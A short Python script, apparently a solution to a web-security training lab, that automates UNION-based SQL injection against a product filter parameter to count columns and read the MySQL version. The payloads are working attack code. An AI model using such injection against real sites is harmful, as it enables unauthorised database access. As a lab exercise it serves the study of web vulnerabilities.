import requests as r

from time import sleep


# lab name: SQL injection attack, querying the database type and version on MySQL and Microsoft



link = "" # without the last backslash
vuln_path ="/filter?category=Accessories"


# we have one hint : 
# the db is probably MySQL or MsSql
# first thing is find how to comment 
# thank to this cheatsheet 
# https://portswigger.net/web-security/sql-injection/cheat-sheet
# comment is wether '--' or '#' or '-- ' (with a last space)


# after some attempt we find out that we have a MySQL db and we need to use the followin comment '-- '
# ex:  Accessories' -- (with space after the --)


# let's find the number of column
def found_columns():
    
    col = 0
    response ="Error"
    payload="\' union select "
    while "Error" in  response : 
        if col == 0:
            payload += "null"
        else:
            payload+=",null"
        finalLink = link+vuln_path+payload + " -- "  
        col+=1
        my_req = r.get(finalLink)
        response = my_req.text
        print(finalLink)
        
        sleep(0.4)

    print("Found {} columns".format(col))
    return col




#number_col = found_columns()  # returns 2 columns

# after the following enumeration :  
# 
# ' union selct 'a', 'a' --   
# 
# 
# we find out that the two columns are string data type

payload = "\' union select @@version,null -- "


full_link = link + vuln_path + payload
my_req = r.get(full_link)

response = my_req.text